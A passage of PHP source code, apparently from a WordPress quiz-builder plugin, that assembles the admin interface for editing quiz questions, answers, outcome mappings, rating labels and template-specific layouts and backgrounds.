																	<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/multiple-choice.svg"><a href="javascript:void(0)" value="multi" >Multiple Choice</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/yes-no.svg"><a href="javascript:void(0)" value="yes_no" >Yes/No</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/text.svg"><a href="javascript:void(0)" value="text" >Text</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/numerical-value.svg"><a href="javascript:void(0)" value="numerical_text" >Numerical Value</a></li>
																	<li class="showHideQueTypeOption_assessment_scoring" style="'.$ques_type_rating.'" ><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/rating.svg"><a href="javascript:void(0)" value="rating" >Rating Scale</a></li>
																	<li class="showHideQueTypeOption" style="'.$ques_type_fill.'"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/fill-in-blank.svg"><a href="javascript:void(0)" value="fill_in_blank" >Fill In Blank</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/file-upload.svg"><a href="javascript:void(0)" value="file_upload" >File Upload</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/slider.svg"><a href="javascript:void(0)" value="slider" >Slider</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/matrix.svg"><a href="javascript:void(0)" class="showQueTypeOption_assessment_scorings"  value="matrix" style="'.$ques_type_matrix.'">Matrix</a></li>
																	<li class="showHideQueTypeOption_assessment_scoring" style="'.$ques_type_ranking_choices.'"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/ranking-choice.svg"><a href="javascript:void(0)" value="ranking_choices" >Ranking / Choice</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/date.svg"><a href="javascript:void(0)" value="date" >Date</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/dropdown.svg"><a href="javascript:void(0)" value="dropdown" >Dropdown</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/complete-the-sentence.svg"><a href="javascript:void(0)" value="matching_text" >Complete the Sentences</a>
																	</li>
                                                                    <li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/email.svg"><a href="javascript:void(0)" value="email" >Email</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/phone-number.svg"><a href="javascript:void(0)" value="phone_number" >Phone Number</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/height.png"><a href="javascript:void(0)" value="weight_and_height" >Weight and Height</a></li>
																	<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/name.png"><a href="javascript:void(0)" value="name" >Name</a></li>
																</ul>
																'.$answer_type_tool_tip.'
															</div>
															<div class="add_more_rating_btn" style="'.$add_rating_btn_display.'">Add More Ratings</div>
															<div class="dropdown-link-style dropdown">
																<button class="dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <span> ...</span></button>
																<div class="dropdown-menu" aria-labelledby="dropdownMenuButton" x-placement="bottom-start" style="position: absolute; will-change: transform; top: 0px; left: 0px; transform: translate3d(17px, 30px, 0px);">
																	<a class="dropdown-item" href="#">
																		<div class="checkbox-custom-style">
																			<input type="checkbox" '.$skipChecked.' class="custom-checkbox-input " name="allow_skip_ques">
																				<span class="custom--checkbox"></span>
																			</div> Allow students to skip questions
																	</a>
																	<div class="sqb_ans_multiple" style="'.$showForMultiple.'"><div class="multile-ans-section">
																		<div class="sqb-multiple-ans-optionsd">
																			<div class="sqb-multiple-ans-on-off">
																				<div class="checkbox-custom-style">
																					<input type="checkbox" class="custom-checkbox-input" name="sqb_multiple_ans_limited" '.$show_multiple_ans_checked.'>
																					<span class="custom--checkbox"></span>
																				</div> 
																				<label>Max allowed answers:</label>
																			</div>
																			<div class="sqb-que-limit">
																				<label for="sqb_multiple_ans_input_limit">Limit to <div class="tool-tip">
																								<i class="fa fa-info-circle" aria-hidden="true"></i>
																								<div class="toll-tip-desc">Limit the number of answers that users can pick
																								</div></div></label>
																				<input type="number" min="1" name="sqb_multiple_ans_input_limit" id="sqb_multiple_ans_input_limit" placeholder="Limit" value="'.$sqb_multiple_ans_input_limit.'">
																			</div>
																			</div>
																		</div>
																	</div>		
																</div>
															</div>
														</div>
															'.$quiz_category_list.'
														</div>';//choose layout - Question type
						
							$answersObj = SQB_QuizAnswers::loadByQuestionId($question_id);
							$ans_html  = '';
							$outcome_html  = '';
							if(is_array($answersObj) && count($answersObj)){
								$answersdataobj_cout_class = ''	;
								//get answers of the question
					 
								if(isset($answersObj) && count($answersObj) < 10){
										$answersdataobj_cout_class = 'ranting_level_'.count($answersObj);
								}
								
								$recommendation_html = '';
								$outcome_index_count  = 1 ;
								foreach($answersObj as $answerObj){
									$answer_id = $answerObj->getId();
									$ans_data = $answerObj->getAnswer();
									if($answerObj->getRecommendationHtml() != ''){
										$recommendation_html .= '<div class="sqb_ans_item_dot_option" >'.stripslashes($answerObj->getRecommendationHtml()).'</div>';
									}
									
									
									$ans_title = $answerObj->getAnswerTitle();
									$ans_hint = $answerObj->getIncorrectAnswerInfo();
									$ans_info = $answerObj->getCorrectAnswerInfo();
									$ans_correct = $answerObj->getCorrectAnswer();
									
									$ans_data =  str_replace("%%ANSWERID%%",$answer_id,$ans_data);
									$ans_data =  str_replace("%%answerid%%",$answer_id,$ans_data);
									if($ans_correct == 'true'){
										$ans_data =  str_replace("%%SQBANSWERCORRECT%%","checked",$ans_data);
										$ans_data =  str_replace("%%sqbanswercorrect%%","checked",$ans_data);
										$ans_data =  str_replace("sqbanswercorrect","checked",$ans_data);
									}else{
										$ans_data =  str_replace("%%SQBANSWERCORRECT%%","",$ans_data);
										$ans_data =  str_replace("%%sqbanswercorrect%%","",$ans_data);
										if($question_type == 'phone_number' || $question_type == 'email'){

										}else{
											$ans_data =  str_replace("checked","",$ans_data);
										}
										$ans_data =  str_replace("sqbanswercorrect","",$ans_data);
									}
									
									$ans_html .= stripslashes($ans_data);
									// $current_date_time = date('y_d_m_h_m_s');
									// $current_date_time_img = "sqb_correct_incorrect_".$current_date_time.'_'.rand(10,1000);
									
									// $ans_html =  str_replace("%%SQBRANDOMNO%%",$current_date_time_img,$ans_html);

									
									$outcomeMappingObj = SQB_OutComeMapping::loadByQuizIdQuestionIdAnsId($_GET['id'] ,$question_id,$answer_id);
									if(isset($outcomeMappingObj)){
										
										
										$outcome_table_id = $outcomeMappingObj->getId();
										$outcome_ids = $outcomeMappingObj->getOutcomeId();
										$outcome_ids = explode(",",$outcome_ids);
										
										$outcome_result_clone_list = '<ul class="multi-select-dropdown-list outcome_result_list" style="display: block;">';
										
										$outcome_hmtl = '';
										if(is_array($outcomes_list)){
											foreach($outcomes_list as $outcome_list){
												
												$outcome_checked = '';
												if(in_array($outcome_list->getId(),$outcome_ids)){
													$outcome_checked = 'checked';
												}
												$outcome_result_clone_list .= '<li data-id="">
																<div class="checkbox-custom-style">
																<input type="checkbox" class="custom-checkbox-input" name="outcome_result_checkbox" value="'.$outcome_list->getId().'" '.$outcome_checked.'>
																<span class="custom--checkbox"></span>
															</div>
															<label>'.$outcome_list->getOutcomeName().'</label>
															</li>';
				
											}//foreach loop closed 
										}// if loop closed 
									//echo $outcome_hmtl;
		
									$outcome_result_clone_list .= '</ul>';
									$sqb_round_no = 'sqb_round_no_'.uniqid() . time().'_';
										 
										 $outcome_html   .= '<div class="quiz-content-card"  data-answer-id="'.$answer_id.'" data-id="'.$outcome_table_id.'"  id="'.$sqb_round_no.'"><label for="" class="quiz_label">'.strip_tags(stripslashes($ans_title)).' </label><div class="quiz_right-content"><div class="multi-select-dropdown select_outcome_result_wrapper"><div class="multi-select-dropdown-link select_outcome_result_list"> Select Outcomes <i class="fa fa-angle-down"></i></div>'.$outcome_result_clone_list.'</div></div></div>';
										
									}else{

										$outcome_result_clone_list = '<ul class="multi-select-dropdown-list outcome_result_list" style="display: block;">';
										
										if(is_array($outcomes_list)){
											foreach($outcomes_list as $outcome_list){
												
												$outcome_result_clone_list .= '<li data-id="">
																<div class="checkbox-custom-style">
																<input type="checkbox" class="custom-checkbox-input" name="outcome_result_checkbox" value="'.$outcome_list->getId().'">
																<span class="custom--checkbox"></span>
															</div>
															<label>'.$outcome_list->getOutcomeName().'</label>
															</li>';
				
											}//foreach loop closed 
										}// if loop closed 
										
		
										$outcome_result_clone_list .= '</ul>';


										$sqb_round_no = 'sqb_round_no_'.uniqid() . time().'_';
										$outcome_html .= '<div class="quiz-content-card"  data-answer-id="'.$answer_id.'" data-id="%%OUTCOMEMAPPINGID%%" data-answer-index-id="'.$outcome_index_count.'" id="'.$sqb_round_no.'"><label for="" class="quiz_label">'.strip_tags(stripslashes($ans_title)).' </label><div class="quiz_right-content"><div class="multi-select-dropdown select_outcome_result_wrapper"><div class="multi-select-dropdown-link select_outcome_result_list"> Select Outcomes <i class="fa fa-angle-down"></i></div>'.$outcome_result_clone_list.'</div></div></div>';
									}
									
									
									$outcome_index_count++;
									
									
									
								}
								
								$outcome_html   =  $outcome_html;
								
							}
						
						 
						$rating_html   = '<div class="question_rating_lable_div sqb_question_drag_drop_item rating_info" style="'.$add_rating_btn_display_text.'">
							<div class="question_rating_lable_div_inner question_rating_lable_low rating_info_left">
								<label class="quiz_label">Low Score Label</label>
								<div class="sqb_tiny_mce_editor question_rating_lable_low_text">'.$question_rating_lable_low_text.'</div>
							</div>
							<div class="question_rating_lable_div_inner question_rating_lable_high rating_info_right">
								<label class="quiz_label">High Score Label</label>
								<div class="sqb_tiny_mce_editor question_rating_lable_high_text">'.$question_rating_lable_high_text.'</div>
							</div>
						</div>';
						$quesitons_html .=	$rating_html; 
						$numeric_class = '';
						//$quesitons_html .=	$rating_html; 
						if($question_type == 'matching_text'){
					 		$numeric_class = 'sqb_disable_tiny_mce_editor';
					 	}

						$quesitons_html .=	'<div class="question_add_answer_outer_div sqb_question_drag_drop_item '.$numeric_class.$scoring_quiz_class_pints.$image_option_has_class.$answer_grid_layout_active.$answer_layout_three_in_row_layout_active.$sqb_disable_tiny_mce_editor_class.' '.$answersdataobj_cout_class.' '.$answer_type_matrix_selected_class.' '.$answer_type_single_multi_yes_no_class.'">';
						if($question_type == 'matching_text'){
							$quesitons_html .= '<div class="numerical-message"><span class="full-text">In the text area below, enter the full text and whatever text you want users to fill out, enclose it with square brackets.</span><span class="see-details"> <a href="javascript:void(0)" class="numerical-sidepopup">See this for details. </a></span>';
							 if($quiz_type == 'scoring'){
							 	$quesitons_html .= '<div class="">Points are only assigned for correct answers</div>';
							 }
							 	$quesitons_html .= '</div>';
						}
						if($question_type == 'matrix'){
							$ans_html = stripslashes($matrix_html);
							$ans_html = '<div class="sqb_ans_item_matrix"><span class="answer_matrix_options_show sqb_backend_show ">Click to Add/Edit Matrix Answers</span><div class="answer_matrix_save_table">'.$ans_html.'</div><input type="hidden" name="matrix-column-width" value="'.$matrix_column_width.'"></div>';
						}
						$add_more_ans_btn_text = 'Add New Answer';
						if($question_type == 'file_upload'){
						$add_more_ans_btn_text = 'Add Supported File Types';
						}
						$quesitons_html .=	$ans_html;
						$quesitons_html .=	' </div>';//answer options end
						
						$quesitons_html .=	' </div>';//Quiz-Template5-right-side-inner
						$quesitons_html .=	' <div class="sqb_quiz_template5_next_button_outer skip_continue_button_wrapper">';
						$quesitons_html .=	'<div class="back-question-action" style="'.$backButtonStyle.'">'.$back_btn_html.'</div>';
						$quesitons_html .=	'<div class="skip-question-action" style="'.$skipButtonStyle.'">'.$skip_button_html.'</div>';
						$show_next_button =  $quiz_data->getShowNextButton();	
						if($show_next_button == "Y"){
							$continueButtonStyle = 'display:block;';
						}else if($question_data->question_type == 'multi' || $question_data->question_type == 'text' || $question_data->question_type == 'numerical_text' || $question_data->question_type == 'date' || $question_data->question_type == 'file_upload' || $question_data->question_type == 'slider' || $question_data->question_type == 'dropdown' || $question_data->question_type == 'complete-the-sentence' || $question_data->question_type == 'email' || $question_data->question_type == 'phone_number' || $question_data->question_type == 'weight_and_height' || $question_data->question_type == 'name'){
							$continueButtonStyle = 'display:block';
						}else{
							$continueButtonStyle = 'display:none';
						}
						$quesitons_html .=	'<div class="continue-question-action" style="'.$continueButtonStyle.'">'.$next_button_html.'</div></div>';
						
						$quesitons_html .=	' <div class="question_add_answer_btn_div template5_question_add_answer_btn_div sqb_question_drag_drop_item" style="'.$add_answer_btn_display.'">
						<div class="question_add_more_ans_btn" style="">'.$add_more_ans_btn_text.'</div></div>';
						
						$quesitons_html .=	' </div>';//Quiz-Template5-right-side
						$quesitons_html .=	' </div>';//template5 inner
						
						$map_skip_class = ' ';
						$map_not_skip_class = ' outcome-option-active';
						$ans_outcome_option_wrapper = '';
						
						if($skip_outcome_mapping_checked == 'Y'){
							$map_skip_class = ' outcome-option-active';
							$map_not_skip_class = '';
							$ans_outcome_option_wrapper = "display:none;";
						}
						
						$quesitons_html .=	'<div class="question_add_answer_btn_div sqb_question_drag_drop_item">
							<div class="question_add_more_ans_btn" style="'.$add_answer_btn_display.'">'.$add_more_ans_btn_text.'</div>
							<div class="assessment_outcome_connect_btn  personality_outcome_connect_btn" style="'.$ans_outcome_option_show.'">					
							   
                                <div class="outcome-options">
                                    <span class="outcome-option-connect '.$map_not_skip_class.'" >Connect to Outcome </span>
                                    <span class="outcome-option-skip '.$map_skip_class.'" >Skip Mapping </span>
                                </div>
							</div>
						</div>
						';//add answer - connect to outcome
						
						$quesitons_html .= '</div>';//upto All divs are added
						if($outcome_html == ''){
							$ans_outcome_option_wrapper = "display:none;";
						}
						
						$display_skip_outcome_section_style = '';
						if($quiz_data->getTemplate() == 'template5') {
						$display_skip_outcome_section_style = "style='display:none;'";
						}  
						
						$quesitons_html .=	'<div class="sqb_add_more_question_section" '.$display_skip_outcome_section_style.'>
						<div class="question_add_answer_btn_div sqb_question_drag_drop_item">
							<div class="question_add_more_ans_btn" style="'.$add_answer_btn_display.'">'.$add_more_ans_btn_text.'</div>
							<div class="assessment_outcome_connect_btn  personality_outcome_connect_btn" style="'.$ans_outcome_option_show.'">					
                                <div class="outcome-options">
                                    <span class="outcome-option-connect '.$map_not_skip_class.'" >Connect to Outcome </span>
                                    <span class="outcome-option-skip '.$map_skip_class.'" >Skip Mapping</span>
                                </div>
							</div>
						</div></div>';//add answer - connect to outcome
						
						
						$quesitons_html .= '<div class="assessment_outcome_connect_wrapper '.$answer_edit_text_class.'" style="'.$ans_outcome_option_wrapper.$ans_outcome_option_show.'">';
						$quesitons_html .= '<div class="assessment_outcome_head">
								<div class="AO_head_title">Map Answers to Outcome</div>
							</div>
							
							<div class="assessment_outcome_connect" style="'.$ans_outcome_option_hide.'"> '.$outcome_html.'
						</div></div>';

						$quesitons_html .='
						<div class="QA-advance-option">
						<div class="quiz-content-card show_correct_inccorect_ans_checkbox_wrapper">
							<label for="" class="quiz_label">Do you want to display incorrect/correct answers?</label>
							<div class="quiz_right-content">
								<div class="square-switch_onoff">
									<input class="checkbox" name="show_correct_inccorect_ans_checkbox" type="checkbox" id="show_correct_inccorect_ans_checkbox_'.$sqb_correct_incorrect_random_no.'" value="Y" '.$show_correct_incorrect_ans.' >
									<label for="show_correct_inccorect_ans_checkbox_'.$sqb_correct_incorrect_random_no.'"></label>
								</div>
							</div>
						</div>
						<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
								<label for="" class="quiz_label">Correct answer message</label>
								<div class="quiz_right-content">
									<textarea class="sqb_correct_ans sqb_text_tiny_mce_editor">'.stripslashes($ans_info).'</textarea>
								</div>
						</div>
						<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
								<label for="" class="quiz_label">Incorrect answer message</label>
								<div class="quiz_right-content">
									<textarea class="sqb_incorrect_ans sqb_text_tiny_mce_editor">'.stripslashes($ans_hint).'</textarea>
									
								</div>
						</div>
						</div>';
						if($quiz_type != 'poll'){
							$quesitons_html .= '<div class="save_and_add_more_quesiton_btn_wrapper">
								<div class="save_question_btn" onclick="save_single_question()" >Save This Question</div>
								<div class="add_more_question_btn" onclick="sqb_add_more_question()">Add More Questions</div>
							</div>';
						}
					
						$quesitons_html .= '</div>';
						$quesitons_html .= '<div class="sqb_answer_bot_option_wrapper_outer">'.$recommendation_html.'</div>';		
						$quesitons_html .= '</div>';	
 
						 $quesitons_html .= '</div>';
						 $quesitons_html .= '</div>';
						 $quesitons_html .= '</div>';
							   
						   } else {
						   
						   $quesitons_html .= '<div class="card sqb_question_no tab-pane fade '.$show_fist_question_class.' sqb_question_id_'.$question_id.'" id="'.$question_count_class.'">';
						   $quesitons_html .= '<div class="card-header" id="headingOne" style="display:none">
												<i class="fa fa-arrows question_sortable_icon" aria-hidden="true"></i> <a >Question '.$question_count.'</a>
												<div class="delete-qa-row"><i class="fa fa-trash-o" aria-hidden="true"></i></div>
											</div>';
						  $quesitons_html .= '<div  class="sqb_question_collapse" >';
						  // $quesitons_html .= '<div class="delete-qa-row sqb_delete_btn">Delete</div>';
						if($quiz_type != 'poll'){
						  $quesitons_html .= '<div class="question-delete-clone"><div class="delete-qa-row sqb_delete_btn"><i class="fa fa-trash-o" aria-hidden="true" title="Delete this Question"></i></div><div class="clone-qa-btn"><i class="fa fa-clone" aria-hidden="true" title="Clone this Question"></i></div></div>';
						}
						  $quesitons_html .= '<div class="card-body">';
						 
						  $template_no_class = '';
						  if($quiz_data->getTemplate() == 'template2'){
							   $template_no_class = 'outer-style1 ';
						  }else if($quiz_data->getTemplate() == 'template3'){
							  $template_no_class = ' outer-style2 ';
							  
						  }else if($quiz_data->getTemplate() == 'template7'){
							  $template_no_class = ' outer-style7 ';
						  }else if($quiz_data->getTemplate() == 'template8'){
							  $template_no_class = ' outer-style8 ';
							  if($quiz_data->getTransparentBackgroundSettings() != ''){
								  
							  }
						  }else if($quiz_data->getTemplate() == 'template4'){
							 
						  }else if($quiz_data->getTemplate() == 'template6'){
						  	$default_image = '';
								if($quiz_data->getTransparentBackgroundSettings() != ''){

									$get_settings = $quiz_data->getTransparentBackgroundSettings();

									$get_details = explode("|",$get_settings);
									$width_sign = $get_details[0];
									$background_width = $get_details[1];
									if($background_width == 'undefined'){
										$background_width = '';
									}
									$height_sign = $get_details[2];
									$background_height = $get_details[3];
									if($background_height == 'undefined'){
										$background_height = '';
									}
									$settings_image = $get_details[4];
									$min_height = $get_details[5];
									$background_color = '#fff7f0';
									if(isset($get_details[9])){
										$background_color = $get_details[9];
									}
									if(isset($get_details[12])){
									$template6_background_padding = $get_details[12];
									}
									$default_image .= 'background-image:url('.$settings_image.');';
									if($width_sign == 'px'){
										$default_image .= 'width:'.$background_width.'px;';
										$default_image .= 'background-repeat:no-repeat;';
										$default_image .= 'background-position:center center;';
										$default_image .= 'background-size: cover;';
									} else if($width_sign = '%'){
										$default_image .= 'width:'.$background_width.'%;';
										$default_image .= 'background-repeat:no-repeat;';
										$default_image .= 'background-position:center center;';
										$default_image .= 'background-size: cover;';
									}

									if($height_sign == 'px'){
										$default_image .= 'min-height:'.$background_height.'px;';
										$default_image .= 'display: flex;';
										$default_image .= 'justify-content: center;';
										$default_image .= 'align-items: center;';
									} else if($height_sign = 'vh'){
										$default_image .= 'min-height:'.$background_height.'vh;';
										$default_image .= 'display: flex;';
										$default_image .= 'justify-content: center;';
										$default_image .= 'align-items: center;';
									}
									if(!empty($get_details[12])){
										$default_image .= 'padding:'.$get_details[12].'px 0;';
									}
									$default_image .= 'background-color: '.$background_color.';';
								}else{
									$default_image = 'background-image:url('.plugin_dir_url(__FILE__).'../../includes/images/template6-latest.jpeg);';
									$default_image .= 'background-repeat:no-repeat;';
									$default_image .= 'background-position:center center;';
									$default_image .= 'background-size: cover;';
								} 
						  }
						 
						  $quesitons_html .= '<div class="question_div_outer" id="'.$current_date_time_mian_div.'">
												
												<input type="hidden" name="question_temp_name" value="standard">
												<input type="hidden" name="question_temp_no" value="template1">
												<input type="hidden" name="question_file_upload_settings" value="'.$question_data->getFileUploadSettings().'">
												<input type="hidden" name="enable_question_background_image" value="N">
												<input type="hidden" name="question_background_image" value="">
												<input type="hidden" name="progress_bar_color" value="#000">';
												
						$quesitons_html .= '<div class="question_div_inner"  style=" position: relative;">';

						$question_customizer = $question_data->getTempCustomizer();
							
							$question_customizer_array = explode("||",$question_customizer);
							$question_style = '';
							if(isset($question_customizer_array[0])){
								$question_max_width = $question_customizer_array[0];
								$question_style= "style='max-width:".$question_max_width."'";
							}
							
							$question_rating_lable_low_text = '<div>Strongly Disagree</div>';
							$question_rating_lable_high_text = '<div>Strongly Agree</div>';
							
							$question_inner_style = '';
							$rating_box_style = '';
							if($quiz_data->getTemplate() == 'template8'){
								$question_inner_width = !empty($question_customizer_array[1]) ? $question_customizer_array[1] : '';
							}
							
							if($question_type  == 'rating'){
								if(isset($question_customizer_array[1])){
									$question_rating_lable_low_text = stripslashes($question_customizer_array[1]);
								}
								if(isset($question_customizer_array[2])){
									$question_rating_lable_high_text = stripslashes($question_customizer_array[2]);
								}
								if($quiz_data->getTemplate() == 'template8'){
								$question_inner_width = $question_customizer_array[3];
								}
							}
							
							if($question_type  == 'matrix'){
								$question_inner_width = ($question_inner_width != '')? $question_inner_width : '1200px';
							}
							
							$question_inner_width = isset($question_inner_width) ? $question_inner_width : '';

							$question_inner_style = "style='max-width:".$question_inner_width."'";
							$rating_box_style = "; max-width:".$question_inner_width;
							
							

							$quiz_category_list = '';
							if(($quiz_type == 'scoring') || ($quiz_type == 'assessment')){
								$quiz_category_enable = $quiz_data->getCategory();
								$category_show_hide_option = 'N';
								if($question_type == 'multi'){
										$category_show_hide_option = 'Y';
								}else if($question_type == 'single'){
										$category_show_hide_option = 'Y';
								}else if($question_type == 'yes_no'){
									$category_show_hide_option = 'Y';
								}else if($question_type == 'matrix'){
									$category_show_hide_option = 'Y';
								}
								if($quiz_category_enable  == 'Y'){

								}else{
									$category_show_hide_option = 'N';
								}
									
								$quiz_category_list = sqbGetQuizCategoryListHtmlOfQuestionScreen($question_data->getCategoryId() , $category_show_hide_option);
							}

							$edit = 'edit';
							$sel_temp = $quiz_data->getTemplate();

							$multiple_ans_checked = "N";
							$sqb_multiple_ans_input_limit = "";
							$question_settings = $question_data->getQuestionSetting();
								if(!empty($question_settings)){
									$question_settings = maybe_unserialize($question_settings);

							//echo '<pre>';print_r($question_settings);
								if (is_array($question_settings) && array_key_exists('multiple_ans_checked', $question_settings)) {
								//if(array_key_exists('multiple_ans_checked', $question_settings)){
									$multiple_ans_checked = $question_settings['multiple_ans_checked'];
								}

								if (is_array($question_settings) && array_key_exists('sqb_multiple_ans_input_limit', $question_settings)) {
								//if(array_key_exists('sqb_multiple_ans_input_limit', $question_settings)){
									$sqb_multiple_ans_input_limit = $question_settings['sqb_multiple_ans_input_limit'];
								}
							}

						//if($quiz_data->getTemplate() == 'template8' || $quiz_data->getTemplate() == 'template6'|| $quiz_data->getTemplate() == 'template7'){
								$quesitons_html .= template8_top_settings_section_edit_mode($edit,$sel_temp,$layout_value,$layout_text,$skipChecked,$ans_with_img,$options_data,$ans_image_size_custom,$ans_image_width,$ans_image_height,$ans_show_image_label,$answer_type_matrix_selected_class,$question_type_option,$tool_tip_related_style,$question_type,$question_type_text,$ques_type_rating,$ques_type_fill,$answer_type_tool_tip,$add_rating_btn_display,$quiz_category_list,$question_image,$multiple_ans_checked,$sqb_multiple_ans_input_limit);
						//	}

							$show_multiple_ans_checked = "";
							if($multiple_ans_checked == 'Y'){
								$show_multiple_ans_checked = "checked";
							}
							$showForMultiple = 'display:none;';
							if($question_type == 'multi'){
								$showForMultiple = '';
							}
						$quesitons_html .= '<div class="question-screen '.$sqb_start_screen_background_image.'" style="'.$default_image.'">';
						
							
							if($quiz_data->getTemplate() == 'template4'){					
								$quesitons_html .='<div class="outer-style3 outer_style3_new" '.$question_style.'><span class="outer_style3_span_first" style="border-color:#ff634d"></span><span style="border-color:#ff634d" class="outer_style3_span_second"></span><div class="Quiz-Template  quiz_comon_template sqb_question_enable_drag_drop " data-id="'.$question_id.'" >';
								
							}else{
								
								$quesitons_html .='<div class="Quiz-Template quiz_comon_template sqb_question_enable_drag_drop '.$template_no_class.'" data-id="'.$question_id.'" '.$question_style.'>';
							}
				
							$quesitons_html .=	'<div class="sqbv2-template8-question-screen-inside">'.$qustion_html;	
							
								
							$quesitons_html .=	'<div class="ans_layout_div" style="'.$ans_layout_option_display.'">
													<div class="answer-view-options">
														<label>Choose layout:</label>
														<div class="sqb_ans_layout_standard  ans_layout_typw '.$ans_standar_layout.'"><i class="fa fa-bars" aria-hidden="true"></i></div>
														<div class="sqb_ans_layout_mulitple ans_layout_typw '.$ans_multiple_layout.' "><i class="fa fa-th-large" aria-hidden="true"></i></div>
														<div class="sqb_ans_layout_three_in_row ans_layout_typw '.$ans_three_in_row_layout_layout_selected.'"><i class="fa fa-th" aria-hidden="true"></i></div>
													
													</div>

													<div class="sqb_ans_add_image">
														<div class="sqb-image-on-off">
															<div class="checkbox-custom-style">
																<input type="checkbox"  class="custom-checkbox-input" name="sqb_ans_with_img_checkbox" '.$ans_with_img_checked.'>
																<span class="custom--checkbox"></span>
															</div> 
															<label>Image Answer</label>

															<div class="dropdown-link-style dropdown">
																<button class="dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true"> <span> ...</span></button>
																<div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
																	<a class="dropdown-item" href="#" style="display:none"><div class="checkbox-custom-style" >
																		<input type="checkbox"  class="custom-checkbox-input " name="multiple_correct_ans" '.$multiple_correct_ans_checked.'>
																		<span class="custom--checkbox"></span>
																		</div> Show Multiple Correct Answers
																		</a>
																		<a class="dropdown-item" href="#">
																			<div class="checkbox-custom-style">
																				<input type="checkbox" '.$skipChecked. 'class="custom-checkbox-input " name="allow_skip_ques">
																					<span class="custom--checkbox"></span>
															 				</div> Allow students to skip questions
																		</a>		
																	<a class="dropdown-item delete-qa-row" style="display:none">Delete Question</a>
																</div>
															</div>
														</div>
														
														<div class="sqb-ans-image-options img-answer-'.$ans_with_img.'">
															<div class="sqb-image-size-dropdown">
																<select class="ans-image-size-options" name="ans-image-size-options">
																	'.$options_data.'
																</select>
															</div>
															<div class="sqb-image-custom-size-option sqb-custom-size-'.$ans_image_size_custom.'">
																<!-- <input id="sqb_image_custom_size" class="slider sqb-range-slider" data-slider-id="sqb_img_size_wrapper" type="text" data-slider-min="100" data-slider-max="1200" data-slider-step="1" data-slider-value="300"> -->
																<div class="sqb-que-img-height-width">
																	<div class="sqb-que-img-width" style="'.$ans_image_size_width.'">
																		<label for="sqb_image_custom_width">Width (PX)</label>
																		<input type="number" min="80" name="sqb_image_custom_width" id="sqb_image_custom_width" value='.$ans_image_width.'>
																	</div>
																	<div class="sqb-que-img-height">
																		<label for="sqb_image_custom_height">Height (PX)</label>
																		<input type="number" min="80" name="sqb_image_custom_height" id="sqb_image_custom_height" value='.$ans_image_height.'>
																	</div>
																</div>
															</div>
															<div class="sqb-image-text-on-off">
																<div class="checkbox-custom-style">
																	<input type="checkbox" class="custom-checkbox-input custom-checkbox-input-hide-ans-label" name="sqb_ans_show_label" value="Y" '.$ans_show_image_label.'>
																	<span class="custom--checkbox"></span>
																</div> 
																<label>Hide answer title in frontend</label>
															</div>
														</div>
														
													</div>
												</div>';
												
								$quesitons_html .=	'<div class="skip-questions-div template7-skip-question-button">
											<div class="checkbox-custom-style">
												<input type="checkbox" class="custom-checkbox-input" name="skipquestion" '.$skipChecked.'>
												<span class="custom--checkbox"></span>
											</div> 
											<label>Allow Skip?</label>
										</div>
										
										<div class="choose-layout-div template7-choose-layout-section">
										   <div class="dropdown dropdown-custom-style">
											   <button class="dropdown-toggle question-select-layout" type="button" data-value="'.$layout_value.'">'.$layout_text.'<span class="caret"></span></button>
											   <ul class="dropdown-menu question_layout_type_list_ul"><li><a href="javascript:void(0)" value="choose_layout">Choose Layout</a></li>
												   <li><a href="javascript:void(0)" value="one_column">1 Column</a></li>
												   <li><a href="javascript:void(0)" value="two_column">2 Columns</a></li>
												   <li><a class="column-hide-template9" href="javascript:void(0)" value="three_column">3 Columns</a></li>
												   <li><a class="column-hide-template6" href="javascript:void(0)" value="four_column">4 Columns</a></li>
												   <li><a class="column-hide-template6" href="javascript:void(0)" value="five_column">5 Columns</a></li>
												   <li><a class="column-hide-template6" href="javascript:void(0)" value="six_column">6 Columns</a></li>
											   </ul>
										   </div>
										</div>
										
										<div class="question_drop_down_wrapper"> <div class="quiz-content-card question-type-card question_type_wrapper '.$answer_type_matrix_selected_class.'" style="'.$question_type_option.'">
															<label  class="quiz_label">Question  Type</label>
															<div class="multile-ans-section">
															<div class="dropdown dropdown-custom-style" '.$tool_tip_related_style.'>
																<button class="dropdown-toggle" type="button" data-value="'.$question_type.'">'.$question_image.'<span>'.$question_type_text.'</span>
																<span class="caret"></span></button>
																<ul class="dropdown-menu question_type_list_ul">
																	<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg"><a href="javascript:void(0)" value="single" >Single Choice</a></li>
																	<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/multiple-choice.svg"><a href="javascript:void(0)" value="multi" >Multiple Choice</a></li>
